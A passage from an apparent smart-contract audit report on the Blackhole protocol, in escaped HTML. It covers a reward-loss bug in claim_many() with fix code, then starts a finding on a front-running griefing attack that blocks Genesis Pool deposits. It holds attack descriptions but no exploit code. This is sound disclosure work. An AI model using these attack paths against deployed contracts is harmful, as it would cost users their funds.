class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eRelevant code from \u003ccode\u003eclaim_many()\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"24\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_locked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026amp;\u0026amp; !\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_locked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisPermanent\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e){\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_nftOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_voting_escrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eownerOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_nftOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_voting_escrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeposit_for\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"impact-3\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-3\" aria-label=\"impact 3 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eThis inconsistency has significant impact for users who have delegated their tokens to the AVM system:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eUsers who have expired locks and whose tokens are managed by AVM will lose their rewards if \u003ccode\u003eclaim_many()\u003c/code\u003e is called instead of \u003ccode\u003eclaim()\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eThe rewards will be sent to the AVM contract, which has no mechanism to forward these tokens to their rightful owners.\u003c/li\u003e\n\u003cli\u003eThis results in permanent loss of rewards for affected users.\u003c/li\u003e\n\u003cli\u003eSince \u003ccode\u003eclaim_many()\u003c/code\u003e is more gas efficient for claiming multiple tokens, it’s likely to be frequently used, increasing the likelihood and impact of this issue.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eAdd the AVM check to the \u003ccode\u003eclaim_many()\u003c/code\u003e function to match the behavior in \u003ccode\u003eclaim()\u003c/code\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"25\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_locked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026amp;\u0026amp; !\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_locked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisPermanent\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e){\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_nftOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_voting_escrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eownerOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026amp;\u0026amp; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etokenIdToAVMId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) != \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_nftOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetOriginalOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_nftOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_voting_escrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeposit_for\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003eFor better code maintainability, consider refactoring the owner resolution logic to a separate internal function:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"26\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_getRewardRecipient\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_nftOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoting_escrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eownerOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026amp;\u0026amp; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etokenIdToAVMId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) != \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_nftOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetOriginalOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_nftOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThen, use this function in both \u003ccode\u003eclaim()\u003c/code\u003e and \u003ccode\u003eclaim_many()\u003c/code\u003e to ensure consistent behavior.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-3\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eScenario:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eUser A delegates their tokenId #123 to the AVM system.\u003c/li\u003e\n\u003cli\u003eThe lock for tokenId #123 expires.\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eSomeone calls \u003ccode\u003eclaim(123)\u003c/code\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAVM check triggers and rewards go to User A (correct behavior)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eSomeone calls \u003ccode\u003eclaim_many([123])\u003c/code\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eNo AVM check happens, rewards go to the AVM contract (incorrect behavior)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eUser A permanently loses their rewards.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-31\"\u003erayss\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-25\"\u003emaxvzuvex\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-05-griefing-attack-on-genesispoolmanagersoldepositnativetoken-leading-to-denial-of-service\" style=\"position:relative;\"\u003e\u003ca href=\"#m-05-griefing-attack-on-genesispoolmanagersoldepositnativetoken-leading-to-denial-of-service\" aria-label=\"m 05 griefing attack on genesispoolmanagersoldepositnativetoken leading to denial of service permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-166\"\u003e[M-05] Griefing attack on \u003ccode\u003eGenesisPoolManager.sol::depositNativeToken\u003c/code\u003e leading to Denial of Service\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-122\"\u003eFavourOkerri\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-348\"\u003eAvantGard\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/factories/GenesisPoolFactory.sol#L56-L67\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/factories/GenesisPoolFactory.sol#L56-L67\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/factories/PairFactory.sol#L139-L151\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/factories/PairFactory.sol#L139-L151\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GenesisPoolManager.sol#L100-L116\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GenesisPoolManager.sol#L100-L116\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-3\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-3\" aria-label=\"finding description 3 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe process of depositing native token to a Genesis Pool is vulnerable to a griefing attack, leading to a denial of service (DoS) for legitimate pool creations.\u003c/p\u003e\n\u003cp\u003eThe vulnerability arises from the interaction of the following factors:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003ePublic information: The \u003ccode\u003enativeToken\u003c/code\u003e and \u003ccode\u003efundingToken\u003c/code\u003e addresses intended for a new Genesis Pool become public information when the \u003ccode\u003eGenesisPoolFactory.createGenesisPool\u003c/code\u003e transaction enters the mempool or through the \u003ccode\u003eGenesisCreated\u003c/code\u003e event it emits.\u003c/li\u003e\n\u003cli\u003eUnrestricted pair creation: The \u003ccode\u003epairFactory.createPair\u003c/code\u003e function allows any external actor to create a new liquidity pair for any given tokenA, tokenB, and stable combination, provided a pair for that combination doesn’t already exist.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"27\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreatePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan 